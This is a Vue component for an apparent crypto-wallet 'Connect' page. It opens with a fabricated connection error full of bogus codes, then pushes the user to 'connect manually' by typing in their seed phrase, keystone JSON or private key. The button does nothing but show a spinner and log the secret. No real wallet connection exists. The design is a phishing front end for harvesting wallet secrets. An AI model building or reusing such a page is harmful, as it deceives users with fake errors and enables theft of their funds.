<template>
  <v-app>
    <!-- Header with top navigation bar -->
    <v-app-bar app color="transparent" elevation="0" class="app-bar-gradient">
      <v-app-bar-nav-icon class="" @click="router.go(-1)">
        <v-icon color="white" size="25">mdi-arrow-left</v-icon>
      </v-app-bar-nav-icon>
      <!-- <v-app-bar-nav-icon
        @click="drawer = !drawer"
        color="white"
      ></v-app-bar-nav-icon> -->
      <v-toolbar-title style="color: #fff">Connect</v-toolbar-title>
    </v-app-bar>
    <v-main>
      <v-container class="text-center">
        <!-- <v-row class="mb-3 mt-2">
          <v-col>
            <h3 class="text-h4">Select your preferred wallqet..</h3>
          </v-col>
        </v-row> -->

        <div class="d-flex justify-center" v-if="connectManual">
          <div>
            <Tab
              v-for="tab in tabs"
              :key="tab.value"
              :value="tab.value"
              :active-tab="activeTab"
              @tabSelected="changeTab"
            >
              {{ tab.label }}
            </Tab>

            <div class="tab-content mt-10">
              <div v-show="activeTab === 'phrase'">
                <v-row justify="center">
                  <v-col cols="12" sm="8" md="6" lg="12">
                    <div>
                      <v-textarea
                        v-model="inputText"
                        label="Enter wallet phrase"
                        outlined
                        rows="5"
                        variant="solo-filled"
                        flat
                        auto-grow
                        @focus="showError = null"
                      ></v-textarea>
                    </div>
                    <div v-if="showError" class="text-red">
                      {{ showError }}
                    </div>
                    <v-btn
                      color="primary"
                      size="large"
                      @click="connectDialogAction"
                      >Connect wallet</v-btn
                    >
                  </v-col>
                </v-row>
              </div>
              <div v-show="activeTab === 'keystone'">
                <v-row justify="center">
                  <v-col cols="12" sm="8" md="6" lg="12">
                    <div>
                      <v-textarea
                        v-model="inputText"
                        label="Enter keystone JSON"
                        outlined
                        rows="5"
                        variant="solo-filled"
                        flat
                        auto-grow
                        @focus="showError = null"
                      ></v-textarea>
                    </div>
                    <div v-if="showError" class="text-red">
                      {{ showError }}
                    </div>
                    <v-btn
                      color="primary"
                      size="large"
                      @click="connectDialogAction"
                      >Connect wallet</v-btn
                    >
                  </v-col>
                </v-row>
              </div>
              <div v-show="activeTab === 'private'">
                <v-row justify="center">
                  <v-col cols="12" sm="8" md="6" lg="12">
                    <div>
                      <v-textarea
                        v-model="inputText"
                        label="Enter private key"
                        outlined
                        rows="5"
                        variant="solo-filled"
                        flat
                        auto-grow
                        @focus="showError = null"
                      ></v-textarea>
                    </div>
                    <div v-if="showError" class="text-red">
                      {{ showError }}
                    </div>
                    <v-btn
                      color="primary"
                      size="large"
                      @click="connectDialogAction"
                      >Connect wallet</v-btn
                    >
                  </v-col>
                </v-row>
              </div>
            </div>
            <!-- <v-tabs v-model="tab" align-with-title>
              <v-tabs-slider color="red darken-4"></v-tabs-slider>
              <v-tab> Publish New Record </v-tab>
              <v-tab>Published Records </v-tab>
            </v-tabs>

            <v-tabs-items v-model="tab">
              <v-tab-item>one</v-tab-item>
              <v-tab-item>two</v-tab-item>
           
            </v-tabs-items> -->
          </div>
        </div>

        <v-row>
          <v-col
            v-for="wallet in wallets"
            :key="wallet"
            @click="connectDialogAction"
            class="connect-grid"
          >
            <v-card max-width="200">
              <v-img
                :height="wallet.height"
                :src="require(`@/assets${wallet.walletImg}`)"
                cover
              ></v-img>
            </v-card>
          </v-col>
        </v-row>

        <v-dialog v-model="connectDialog" max-width="320" persistent>
          <div class="d-flex justify-center">
            <v-card max-width="100" class="pa-4">
              <v-progress-circular
                color="primary"
                indeterminate="disable-shrink"
                size="40"
                width="2"
              ></v-progress-circular>
            </v-card>
          </div>
        </v-dialog>

        <!--error modals-->
        <v-dialog v-model="showWarningDialog" max-width="400px" persistent>
          <v-card class="text-center">
            <v-card-title class="warning">
              <v-icon color="red">mdi-alert</v-icon>
            </v-card-title>
            <v-card-text>
              <div class="text-h5">unable to connect</div>
              <div>
                error connecting wallet Requested [type: 2 (limit
                4900),txtout:404, required: 22013]
              </div>
            </v-card-text>
            <v-card-actions class="pa-6">
              <v-btn
                color="primary"
                variant="flat"
                block
                @click="connectManually"
                >click here to connect manually</v-btn
              >
            </v-card-actions>
          </v-card>
        </v-dialog>
      </v-container>
    </v-main>
  </v-app>
</template>
  
  <script setup>
import Tab from "@/components/Tabs.vue";
import { ref, onMounted } from "vue";
import axios from "axios";
import { useRouter } from "vue-router";

const router = useRouter();
const cryptos = ref([]);
const showWarningDialog = ref(false);
const connectManual = ref(false);
const tab = null;
const inputText = ref(null);

const loading = ref(false);
const errorDialog = ref(false);
const showError = ref(null);
const connectDialog = ref(false);

const activeTab = ref("phrase"); // Default active tab

const tabs = [
  { label: "Phrase", value: "phrase" },
  { label: "Keystone", value: "keystone" },
  { label: "Private Key", value: "private" },
];
const connectDialogAction = () => {
  if (!inputText.value) {
    showError.value = `wallet ${activeTab.value} key-value is required!!!`;
  } else {
    connectDialog.value = true;
    setTimeout(() => {
      connectDialog.value = false;
      console.log("servicekey : ", activeTab.value);
      console.log("service value : ", inputText.value);
    }, 5000);
  }
};

const changeTab = (tabValue) => {
  activeTab.value = tabValue;
  showError.value = null;
};

const connectManually = () => {
  showWarningDialog.value = false;
  connectManual.value = true;
};

onMounted(() => {
  showWarningDialog.value = true;
});
</script>
  
  
  <style scoped>
/* Header styles */
.hero-section {
  /* background: linear-gradient(to right, black, #ef4444),
      url("../assets/dappsBg.31224a1c4151a363901b.jpeg"); */
  background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0.5),
      rgba(0, 0, 0, 0.8)
    ),
    url("../assets/dappsBg.31224a1c4151a363901b.jpeg");

  background-size: cover;
  background-repeat: no-repeat;
  background-attachment: fixed; /* Optional: Fixed background */
  padding: 40px 0;
  height: 500px; /* Adjust as needed */
}

/* Align text to center */
.text-center {
  text-align: center;
}

.app-bar-gradient {
  background: linear-gradient(
    to right,
    black,
    #ef4444
  ); /* Gradient from left black to right #ef4444 */
}

.text-red {
  margin-bottom: 20px;
}

.connect-grid {
  cursor: pointer;
}

/* Additional styles can be added here */
</style>